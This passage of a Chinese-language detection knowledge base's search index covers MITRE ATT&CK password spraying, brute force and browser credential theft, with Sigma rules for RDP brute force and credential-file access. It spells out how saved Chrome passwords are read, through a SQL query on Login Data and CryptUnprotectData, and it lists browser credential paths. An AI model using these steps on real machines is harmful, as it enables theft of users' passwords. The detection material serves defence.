</ul>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1110-003-win-%E5%AF%86%E7%A0%81%E5%96%B7%E5%B0%84/#_4","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u573a\u666f\u4e00\uff1a\u5229\u7528Hydra\u8fdb\u884cRDP\u7206\u7834</p> <p>\u573a\u666f\u4e8c\uff1a\u5229\u7528ncrack\u8fdb\u884cRDP\u7206\u7834</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1110-003-win-%E5%AF%86%E7%A0%81%E5%96%B7%E5%B0%84/#_5","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u6682\u65e0</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1110-003-win-%E5%AF%86%E7%A0%81%E5%96%B7%E5%B0%84/#_6","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1110-003-win-%E5%AF%86%E7%A0%81%E5%96%B7%E5%B0%84/#sigma","title":"sigma\u89c4\u5219","text":"<p>\u573a\u666f\u4e00\uff1a\u68c0\u6d4b\u89c4\u5219</p> <pre><code>title: Hydra win7 RDP\u7206\u7834\ndescription: kali windows hydra\nreferences: https://www.96007.club/2019/09/17/Credential-Access-win-Password-spraying/\ntags: T1110-003\nstatus: experimental\nauthor: Blue team\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection1:\n        EventID: 4771 #\u8ba1\u7b97\u673a\u8bd5\u56fe\u9a8c\u8bc1\u5e10\u6237\u7684\u51ed\u636e\u3002\n        AuthenticationPackage: 'MICROSOFT_AUTHENTICATION_PACKAGE_V1_0'\n        LogonAccount: '*'\n        SourceWorkstation: '*'\n        ErrorCode: '0xc0000064'\n    selection2:\n        EventID: 4625\n        LogonType: 3\n        FailureReason: '\u672a\u77e5\u7528\u6237\u540d\u6216\u5bc6\u7801\u9519\u8bef\u3002' #\u5931\u8d25\u4fe1\u606f&gt;\u5931\u8d25\u539f\u56e0\n        Status: 0xc000006d   #\u5931\u8d25\u4fe1\u606f&gt;\u72b6\u6001\n        SubStatus: 0xc0000064  #\u5931\u8d25\u4fe1\u606f&gt;\u5b50\u72b6\u6001\n        LogonProcess: 'NtLmSsp' #\u8be6\u7ec6\u7684\u8eab\u4efd\u9a8c\u8bc1\u4fe1\u606f&gt;\u767b\u9646\u8fdb\u7a0b\n        AuthenticationPackage: 'NTLM' #\u8be6\u7ec6\u7684\u8eab\u4efd\u9a8c\u8bc1\u4fe1\u606f&gt;\u8eab\u4efd\u9a8c\u8bc1\u5305\n    timeframe: last 2s\n    condition: all of them\nlevel: medium\n#\u6ce8\u610f\uff1a\u5728\u4e00\u5206\u949f\u5185\uff0c\u540c\u4e00\u4e3b\u673a\u4e8b\u4ef6ID\u4e3a4625\u7684\u4e8b\u4ef6\u5927\u4e8e50\u4e2a\uff1b\n</code></pre> <p>\u573a\u666f\u4e8c\uff1a\u68c0\u6d4b\u89c4\u5219</p> <pre><code>title: ncrack win7 RDP\u7206\u7834\ndescription: kali windows ncrack\nreferences: https://www.96007.club/2019/09/17/Credential-Access-win-Password-spraying/\ntags: T1110-003\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection1:\n        EventID: 4771 #\u8ba1\u7b97\u673a\u8bd5\u56fe\u9a8c\u8bc1\u5e10\u6237\u7684\u51ed\u636e\u3002\n        AuthenticationPackage: 'MICROSOFT_AUTHENTICATION_PACKAGE_V1_0'\n        LogonAccount: '*'\n        SourceWorkstation: '*'  #\u6e90\u5de5\u4f5c\u7ad9\u5730\u5740\u7b49\u4e8ewin7\u672c\u673a\u4e3b\u673a\u540d\n        ErrorCode: 0xc0000064\n    selection2:\n        EventID: 4625\n        LogonType: 10\n        FailureReason: '\u672a\u77e5\u7528\u6237\u540d\u6216\u5bc6\u7801\u9519\u8bef\u3002' #\u5931\u8d25\u4fe1\u606f&gt;\u5931\u8d25\u539f\u56e0\n        Status: 0xc000006d   #\u5931\u8d25\u4fe1\u606f&gt;\u72b6\u6001\n        SubStatus: 0xc0000064  #\u5931\u8d25\u4fe1\u606f&gt;\u5b50\u72b6\u6001\n        CallerProcessName: 'C:\\Windows\\System32\\winlogon.exe' #\u8fdb\u7a0b\u4fe1\u606f&gt;\u8c03\u7528\u65b9\u8fdb\u7a0b\u540d\n        LogonProcess: 'User32' #\u8be6\u7ec6\u7684\u8eab\u4efd\u9a8c\u8bc1\u4fe1\u606f&gt;\u767b\u9646\u8fdb\u7a0b\n        AuthenticationPackage: 'Negotiate' #\u8be6\u7ec6\u7684\u8eab\u4efd\u9a8c\u8bc1\u4fe1\u606f&gt;\u8eab\u4efd\u9a8c\u8bc1\u5305\n    timeframe: last 2s\n    condition: all of them\nlevel: medium\n#\u6ce8\u610f\uff1a\u5728\u4e00\u5206\u949f\u5185\uff0c\u540c\u4e00\u4e3b\u673a\u4e8b\u4ef6ID\u4e3a4625\u7684\u4e8b\u4ef6\u5927\u4e8e50\u4e2a\uff1b\n</code></pre>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1110-003-win-%E5%AF%86%E7%A0%81%E5%96%B7%E5%B0%84/#_7","title":"\u5efa\u8bae","text":"<p>\u5728\u4e00\u5206\u949f\u5185\uff0c\u540c\u4e00\u4e3b\u673a\u5931\u8d25\u4ee3\u7801\u4e3a0x18\uff0c\u4e8b\u4ef6ID\u4e3a4771\u7684\u4e8b\u4ef6\u5927\u4e8e50\u4e2a\uff1b\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1a\u6b64\u89c4\u5219\u53ea\u9002\u7528\u4e8e\u57df\u63a7\u5236\u5668</p> <p>\u5728\u4e00\u5206\u949f\u5185\uff0c\u540c\u4e00\u4e3b\u673a\u4e0a\u4e8b\u4ef6ID\u4e3a4648\u7684\u4e8b\u4ef6\u5927\u4e8e100\u4e2a\uff1b</p> <p>\u60a8\u53ef\u4ee5\u6839\u636e\u60a8\u7684\u5177\u4f53\u73af\u5883\u901a\u8fc7\u7f29\u77ed\u65f6\u95f4\u9608\u503c\u6216\u4e8b\u4ef6\u6570\u91cf\u9608\u503c\u6765\u8c03\u6574\u6bcf\u4e2a\u544a\u8b66\u89c4\u5219\u3002</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1110-003-win-%E5%AF%86%E7%A0%81%E5%96%B7%E5%B0%84/#_8","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1110-003</p> <p>https://attack.mitre.org/techniques/T1110/003</p> <p>LDAP\u8f7b\u91cf\u76ee\u5f55\u8bbf\u95ee\u534f\u8bae</p> <p>https://baike.baidu.com/item/LDAP/2875565?fr=aladdin</p> <p>\u7206\u7834\u5de5\u5177 Hydra \u7b80\u5355\u4f7f\u7528</p> <p>https://www.jianshu.com/p/4da49f179cee</p> <p>CrackMapExec\uff1a\u4e00\u6b3e\u9488\u5bf9\u5927\u578bWindows\u6d3b\u52a8\u76ee\u5f55(AD)\u7684\u540e\u6e17\u900f\u5de5\u5177</p> <p>https://www.freebuf.com/sectool/184573.html</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1110-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/","title":"T1110-\u66b4\u529b\u7834\u89e3","text":""},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1110-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/#attck","title":"ATT&amp;CK\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u60f3\u8bbf\u95ee\u67d0\u8d26\u53f7\u4f46\u4e0d\u77e5\u9053\u8d26\u53f7\u5bc6\u7801\u6216\u4ec5\u83b7\u5f97\u4e86\u8d26\u53f7\u7684\u5bc6\u7801\u54c8\u5e0c\u65f6\uff0c\u53ef\u80fd\u4f1a\u4f7f\u7528\u66b4\u529b\u7834\u89e3\u6280\u672f\u5c1d\u8bd5\u8bbf\u95ee\u6b64\u8d26\u53f7\u3002</p> <p>\u51ed\u636e\u5bfc\u51fa\u7528\u4e8e\u83b7\u53d6\u5bc6\u7801\u54c8\u5e0c\u3002Pass the Hash\u65b9\u6cd5\u884c\u4e0d\u901a\u65f6\uff0c\u653b\u51fb\u8005\u624d\u53ef\u80fd\u4f1a\u7528\u51ed\u636e\u5bfc\u51fa\u7684\u65b9\u6cd5\u6765\u83b7\u53d6\u5bc6\u7801\u54c8\u5e0c\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u76f8\u5e94\u6280\u672f\u6765\u7cfb\u7edf\u5730\u731c\u6d4b\u7528\u4e8e\u8ba1\u7b97\u54c8\u5e0c\u7684\u5bc6\u7801\uff0c\u6216\u8005\u53ef\u4ee5\u4f7f\u7528\u9884\u5148\u8ba1\u7b97\u597d\u7684\u5f69\u8679\u8868\u6765\u7834\u89e3\u54c8\u5e0c\u3002\u653b\u51fb\u8005\u901a\u5e38\u5728\u76ee\u6807\u7f51\u7edc\u4ee5\u5916\u4ed6\u4eec\u81ea\u5df1\u6240\u63a7\u5236\u7684\u7cfb\u7edf\u4e0a\u6765\u7834\u89e3\u54c8\u5e0c\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5728\u5bf9\u5bc6\u7801\u548c\u54c8\u5e0c\u4e00\u65e0\u6240\u77e5\u7684\u60c5\u51b5\u4e0b\u80e1\u4e71\u5c1d\u8bd5\u5bc6\u7801\u6765\u5f3a\u884c\u767b\u5f55\uff0c\u6216\u4f7f\u7528\u4e00\u7cfb\u5217\u5df2\u77e5\u6216\u53ef\u80fd\u7684\u5bc6\u7801\u6765\u5c1d\u8bd5\u66b4\u529b\u7834\u89e3\u3002\u8fd9\u79cd\u64cd\u4f5c\u7684\u98ce\u9669\u6bd4\u8f83\u5927\uff0c\u56e0\u4e3a\u5b83\u53ef\u80fd\u4f1a\u5bfc\u81f4\u5927\u91cf\u8ba4\u8bc1\u5931\u8d25\u548c\u8d26\u53f7\u9501\u5b9a\uff0c\u5177\u4f53\u53d6\u51b3\u4e8e\u7ec4\u7ec7\u7684\u767b\u5f55\u5931\u8d25\u7b56\u7565\u3002</p> <p>\u65e2\u7136\u4f7f\u7528\u591a\u4e2a\u5bc6\u7801\u6765\u66b4\u529b\u7834\u89e3\u4e00\u4e2a\u8d26\u53f7\u4f1a\u5bfc\u81f4\u8be5\u8d26\u53f7\u88ab\u9501\u5b9a\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4f7f\u7528\u5bc6\u7801\u55b7\u6d12\u6280\u672f\u6765\u89c4\u907f\u8fd9\u4e2a\u98ce\u9669\u3002\u5bc6\u7801\u55b7\u6d12\u6280\u672f\u4f7f\u7528\u4e00\u4e2a\uff08\u4f8b\u5982\u201cPassword01\u201d\uff09\u6216\u4e00\u5c0f\u5217\u6ee1\u8db3\u57df\u7684\u590d\u6742\u6027\u7b56\u7565\u7684\u5bc6\u7801\uff08\u5e76\u4e14\u53ef\u80fd\u662f\u5e38\u7528\u7684\u5bc6\u7801\uff09\u548c\u7f51\u7edc\u4e0a\u8bb8\u591a\u5176\u4ed6\u4e0d\u540c\u8d26\u53f7\u6765\u5c1d\u8bd5\u767b\u5f55\u3002</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1110-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u6682\u65e0</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1110-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>\u8ba4\u8bc1\u76f8\u5173\u6570\u636e</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1110-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u6682\u65e0</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1110-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u6682\u65e0</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1110-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1110-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: \u66b4\u529b\u7834\u89e3\ndescription: \u68c0\u6d4b\u4ece\u4e00\u4e2a\u6e90\u5230\u4e00\u4e2a\u76ee\u7684\u5730\u7684\u8bb8\u591a\u8eab\u4efd\u9a8c\u8bc1\u5931\u8d25\uff0c\u8fd9\u8868\u660e\u53ef\u80fd\u5b58\u5728\u66b4\u529b\u884c\u4e3a\ntags:\n    - attack.t1110\nauthor: Aleksandr Akhremchik, oscd.community\nTranslator: 12306Bro\ndate: 2019/10/25\nstatus: experimental\nlogsource:\n    category: authentication #\u8ba4\u8bc1\u6570\u636e\ndetection:\n    selection:\n         action: failure #\u5931\u8d25\n    timeframe: 600s\n    condition: selection | count(category) by dst_ip &gt; 30 #\u7edf\u8ba1\u8ba4\u8bc1\u6570\u636e\u4e2d10\u5206\u949f\u5185\u76ee\u6807IP\u5927\u4e8e30\u4e2a\u4e14\u8ba4\u8bc1\u5931\u8d25\u7684\u6e90IP\u5730\u5740\nfields:\n    - src_ip #\u6e90IP\n    - dst_ip #\u76ee\u7684IP\n    - user # \u7528\u6237\nfalsepositives: #\u8bef\u62a5\n    - Inventarization #\u5e93\u5b58\u5316\n    - Penetration testing #\u6e17\u900f\u6d4b\u8bd5\n    - Vulnerability scanner #\u6f0f\u6d1e\u626b\u63cf\u5668\n    - Legitimate application #\u5408\u6cd5\u7533\u8bf7\nlevel: medium #\u4e2d\n</code></pre>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1110-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/#_6","title":"\u5efa\u8bae","text":"<p>\u6682\u65e0</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1110-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1110</p> <p>https://attack.mitre.org/techniques/T1110/</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1503-win-%E6%9D%A5%E8%87%AAweb%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E5%87%AD%E8%AF%81/","title":"T1555-003-windows-\u6765\u81eaweb\u6d4f\u89c8\u5668\u7684\u51ed\u8bc1","text":""},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1503-win-%E6%9D%A5%E8%87%AAweb%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E5%87%AD%E8%AF%81/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u5728\u540e\u6e17\u900f\u9636\u6bb5\uff0c\u83b7\u5f97\u6743\u9650\u4e4b\u540e\u653b\u51fb\u8005\u9700\u8981\u6536\u96c6\u76ee\u6807\u7cfb\u7edf\u4e0a\u7684\u76f8\u5173\u4fe1\u606f\uff0c\u6536\u96c6\u7684\u4fe1\u606f\u8d8a\u5168\u9762\u8be6\u7ec6\uff0c\u5bf9\u653b\u51fb\u8005\u7684\u8fdb\u4e00\u6b65\u6e17\u900f\u5e2e\u52a9\u66f4\u5927\u3002\u5bf9\u4e8ewindows\u7cfb\u7edf\u6765\u8bb2\uff0c\u7528\u6237\u6d4f\u89c8\u5668\u5f80\u5f80\u5305\u542b\u7740\u6709\u4ef7\u503c\u7684\u4fe1\u606f\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u8bfb\u53d6\u7279\u5b9a\u76ee\u6807\u670d\u52a1\u5668\u4e0a\u7684\u6d4f\u89c8\u5668\u6587\u4ef6\u6765\u4eceWeb\u6d4f\u89c8\u5668\u83b7\u53d6\u51ed\u636e\u3002 Web\u6d4f\u89c8\u5668\u901a\u5e38\u4f1a\u4fdd\u5b58\u51ed\u636e\uff0c\u4f8b\u5982\u7f51\u7ad9\u7528\u6237\u540d\u548c\u5bc6\u7801\uff0c\u4ee5\u4fbf\u5c06\u6765\u65e0\u9700\u624b\u52a8\u8f93\u5165\u5b83\u4eec\uff0c\u5b9e\u73b0\u81ea\u52a8\u767b\u5f55\u3002Web\u6d4f\u89c8\u5668\u901a\u5e38\u5c06\u51ed\u636e\u4ee5\u52a0\u5bc6\u683c\u5f0f\u5b58\u50a8\u5728\u51ed\u636e\u5b58\u50a8\u533a\u4e2d\u3002\u4f46\u662f\uff0c\u5b58\u5728\u4eceWeb\u6d4f\u89c8\u5668\u4e2d\u63d0\u53d6\u7eaf\u6587\u672c\u51ed\u636e\u7684\u65b9\u6cd5\u3002 \u4f8b\u5982\uff0c\u5728Windows\u7cfb\u7edf\u4e0a\uff0c\u53ef\u4ee5\u901a\u8fc7\u8bfb\u53d6\u6570\u636e\u5e93\u6587\u4ef6AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\u5e76\u6267\u884cSQL\u67e5\u8be2\u6765\u4eceGoogle Chrome\u83b7\u5f97\u52a0\u5bc6\u7684\u51ed\u636eSELECT action_url, username_value, password_value FROM logins;\u3002\u7136\u540e\uff0c\u53ef\u4ee5\u901a\u8fc7\u5c06\u52a0\u5bc6\u7684\u51ed\u636e\u4f20\u9012\u7ed9Windows API\u51fd\u6570\u6765\u83b7\u53d6\u7eaf\u6587\u672c\u5bc6\u7801CryptUnprotectData\uff0c\u8be5\u51fd\u6570\u4f7f\u7528\u53d7\u5bb3\u8005\u7684\u7f13\u5b58\u767b\u5f55\u51ed\u636e\u4f5c\u4e3a\u89e3\u5bc6\u5bc6\u94a5\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u4ee5\u5bf9\u5e38\u89c1\u7684Web\u6d4f\u89c8\u5668\uff08\u4f8b\u5982FireFox\uff0cChrome\uff0cEdge\u7b49\uff09\u6267\u884c\u4e86\u7c7b\u4f3c\u7684\u7a0b\u5e8f\u3002\u9664\u6b64\u4e4b\u5916\uff0c\u653b\u51fb\u8005\u8fd8\u53ef\u4ee5\u901a\u8fc7\u5728Web\u6d4f\u89c8\u5668\u8fdb\u7a0b\u5185\u5b58\u4e2d\u641c\u7d22\uff0c\u901a\u5e38\u4e0e\u51ed\u636e\u5339\u914d\u7684\u6a21\u5f0f\u6765\u83b7\u53d6\u51ed\u636e\u3002\u4ece\u7f51\u7edc\u6d4f\u89c8\u5668\u83b7\u53d6\u51ed\u636e\u540e\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c1d\u8bd5\u5728\u4e0d\u540c\u7cfb\u7edf\u6216\u5e10\u6237\u4e4b\u95f4\u56de\u6536\u51ed\u636e\uff0c\u4ee5\u6269\u5927\u8bbf\u95ee\u8303\u56f4\u3002\u5728\u4eceWeb\u6d4f\u89c8\u5668\u83b7\u5f97\u7684\u51ed\u636e\u4e0e\u7279\u6743\u5e10\u6237\uff08\u4f8b\u5982\u57df\u7ba1\u7406\u5458\uff09\u91cd\u53e0\u7684\u60c5\u51b5\u4e0b\uff0c\u8fd9\u53ef\u4ee5\u5927\u5927\u7f29\u77ed\u653b\u51fb\u8005\u7684\u653b\u51fb\u65f6\u95f4\u3002</p> <p>\u4e0d\u540c\u7684\u6d4f\u89c8\u5668\uff0c\u9ed8\u8ba4\u7f13\u5b58\u5b58\u50a8\u7684\u4f4d\u7f6e\u4e0d\u540c\u3002</p> <ul> <li>Chrome\u9ed8\u8ba4\u8d26\u6237\u5bc6\u7801\u51ed\u636e\u5b58\u653e\u4f4d\u7f6e\uff1a<code>%LocalAppData%\\Google\\Chrome\\User Data\\Default\\Login Data</code></li> <li>Firefox\u9ed8\u8ba4\u8d26\u6237\u5bc6\u7801\u51ed\u636e\u5b58\u653e\u4f4d\u7f6e\uff1a<code>key3.db\u548clogins.json\u6587\u4ef6\u5747\u4f4d\u4e8e%APPDATA%\\Mozilla\\Firefox\\Profiles\\[random_profile]\u76ee\u5f55\u4e0b</code></li> <li>Opera\u9ed8\u8ba4\u8d26\u6237\u5bc6\u7801\u51ed\u636e\u5b58\u653e\u4f4d\u7f6e\uff1a<code>C:\\Users\\***\\AppData\\Local\\Opera Software\\Opera Stable\uff08\u5176\u4e2d***\u4e3a\u7cfb\u7edf\u7528\u6237\u540d\uff09</code></li> </ul>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1503-win-%E6%9D%A5%E8%87%AAweb%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E5%87%AD%E8%AF%81/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u6682\u65e0\uff0cmsf\u53ef\u8fdb\u884c\u76f8\u5173\u6d4b\u8bd5</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1503-win-%E6%9D%A5%E8%87%AAweb%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E5%87%AD%E8%AF%81/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows \u5b89\u5168\u65e5\u5fd7</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1503-win-%E6%9D%A5%E8%87%AAweb%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E5%87%AD%E8%AF%81/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":""},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1503-win-%E6%9D%A5%E8%87%AAweb%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E5%87%AD%E8%AF%81/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>windows \u5b89\u5168\u65e5\u5fd7 \u4e8b\u4ef6ID\uff1a4633 \u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1a\u6b63\u5e38\u60c5\u51b5\u4e0b\u4e0d\u4f1a\u6709\u7528\u6237\u9009\u62e9\u5bfc\u51faweb\u6d4f\u89c8\u5668\u7f13\u5b58\u51ed\u636e\u3002\u5f53\u7f51\u5185\u51fa\u73b0\u6b64\u7c7b\u544a\u8b66\u4e8b\u4ef6\uff0c\u503c\u5f97\u5f15\u8d77\u5b89\u5168\u4eba\u5458\u7684\u8b66\u60d5\uff01</p> <p>\u6b64\u7c7b\u4e8b\u4ef6\u53ea\u67092016\u4ee5\u4e0a\u7248\u672c\u7cfb\u7edf\u624d\u5b58\u5728\u6b64\u7c7b\u4e8b\u4ef6\u3002</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1503-win-%E6%9D%A5%E8%87%AAweb%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E5%87%AD%E8%AF%81/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1503-win-%E6%9D%A5%E8%87%AAweb%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E5%87%AD%E8%AF%81/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: windows\u7cfb\u7edf web\u6d4f\u89c8\u5668\u83b7\u53d6\u51ed\u8bc1\ndescription: windows server 2016 \u6d4b\u8bd5\u7ed3\u679c\nreferences: \u6682\u65e0\ntags: T1555-003\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4663 #\u8bd5\u56fe\u8bbf\u95ee\u5bf9\u8c61\u3002\n        Objectserver: Security #\u5bf9\u8c61&gt;\u5bf9\u8c61\u670d\u52a1\u5668\n        Objecttype: file #\u5bf9\u8c61&gt;\u5bf9\u8c61\u7c7b\u578b\n        Objectname:\n           - 'C:\\users\\*\\appdata\\roaming\\opera software\\opera stable\\login data' #\u5bf9\u8c61&gt;\u5bf9\u8c61\u540d Opera\n           - 'C:\\Users\\IEUser\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\kushu3sd.default\\key4.db' #Firefox\n           - 'C:\\Users\\IEUser\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\kushu3sd.default\\logins.json' #Firefox\n           - 'C:\\Users\\IEUser\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data' #Chrome\n        Access: ReadData (\u6216listdirectory) #\u8bbf\u95ee\u8bf7\u6c42\u4fe1\u606f&gt;\u8bbf\u95ee\n    condition: selection\nlevel: medium\n</code></pre>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1503-win-%E6%9D%A5%E8%87%AAweb%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E5%87%AD%E8%AF%81/#_6","title":"\u5efa\u8bae","text":"<p>\u89c4\u5219\u672a\u7ecf\u8fc7\u5b9e\u9645\u6d4b\u8bd5\uff0c\u8c28\u614e\u4f7f\u7528</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1503-win-%E6%9D%A5%E8%87%AAweb%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E5%87%AD%E8%AF%81/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1555-003</p> <p>https://attack.mitre.org/techniques/T1555/003/</p> <p>\u5982\u4f55\u7a83\u53d6\u548c\u89e3\u5bc6\u8fdc\u7a0b\u5b58\u50a8\u5728Chrome\u548cFirefox\u4e2d\u7684\u5bc6\u7801</p> <p>https://null-byte.wonderhowto.com/how-to/hacking-windows-10-steal-decrypt-passwords-stored-chrome-firefox-remotely-0183600/</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-001-linux-%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E5%87%AD%E6%8D%AE/","title":"T1081-linux-\u6587\u4ef6\u4e2d\u7684\u51ed\u636e","text":""},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-001-linux-%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E5%87%AD%E6%8D%AE/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5728\u672c\u5730\u6587\u4ef6\u7cfb\u7edf\u548c\u8fdc\u7a0b\u6587\u4ef6\u5171\u4eab\u4e2d\u641c\u7d22\u5305\u542b\u4e0d\u5b89\u5168\u5b58\u50a8\u7684\u51ed\u636e\u7684\u6587\u4ef6\u3002\u8fd9\u4e9b\u6587\u4ef6\u53ef\u4ee5\u662f\u7528\u6237\u521b\u5efa\u7684\u7528\u4e8e\u5b58\u50a8\u81ea\u5df1\u7684\u51ed\u636e\u7684\u6587\u4ef6\uff0c\u4e00\u7ec4\u4e2a\u4eba\u7684\u5171\u4eab\u51ed\u636e\u5b58\u50a8\uff0c\u5305\u542b\u7cfb\u7edf\u6216\u670d\u52a1\u5bc6\u7801\u7684\u914d\u7f6e\u6587\u4ef6\u6216\u5305\u542b\u5d4c\u5165\u5f0f\u5bc6\u7801\u7684\u6e90\u4ee3\u7801/\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002</p> <p>\u53ef\u4ee5\u901a\u8fc7OS Credential Dumping\u4ece\u5907\u4efd\u6216\u4fdd\u5b58\u7684\u865a\u62df\u673a\u4e2d\u63d0\u53d6\u5bc6\u7801\u3002\u4e5f\u53ef\u4ee5\u4eceWindows\u57df\u63a7\u5236\u5668\u4e0a\u5b58\u50a8\u7684\u7ec4\u7b56\u7565\u9996\u9009\u9879\u4e2d\u83b7\u53d6\u5bc6\u7801\u3002</p> <p>\u5728\u4e91\u73af\u5883\u4e2d\uff0c\u7ecf\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u7684\u7528\u6237\u51ed\u636e\u901a\u5e38\u5b58\u50a8\u5728\u672c\u5730\u914d\u7f6e\u548c\u51ed\u636e\u6587\u4ef6\u4e2d\u3002\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u5c06\u8fd9\u4e9b\u6587\u4ef6\u590d\u5236\u5e76\u5728\u53e6\u4e00\u53f0\u673a\u5668\u4e0a\u91cd\u590d\u4f7f\u7528\uff0c\u6216\u8005\u53ef\u4ee5\u8bfb\u53d6\u5185\u5bb9\uff0c\u7136\u540e\u5c06\u5176\u7528\u4e8e\u8eab\u4efd\u9a8c\u8bc1\uff0c\u800c\u65e0\u9700\u590d\u5236\u4efb\u4f55\u6587\u4ef6\u3002</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-001-linux-%E6%96%